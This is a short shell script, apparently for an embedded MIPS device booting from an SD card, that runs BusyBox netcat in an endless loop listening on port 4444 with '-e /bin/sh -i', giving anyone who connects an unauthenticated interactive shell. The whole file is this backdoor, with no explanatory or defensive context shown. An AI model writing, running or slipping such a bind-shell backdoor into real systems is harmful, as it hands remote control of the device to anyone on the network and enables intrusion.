#!/bin/sh

while true; do
    /media/mmc/door/busybox-mipsel nc -lp 4444 -e /bin/sh -i;
    sleep 1
done
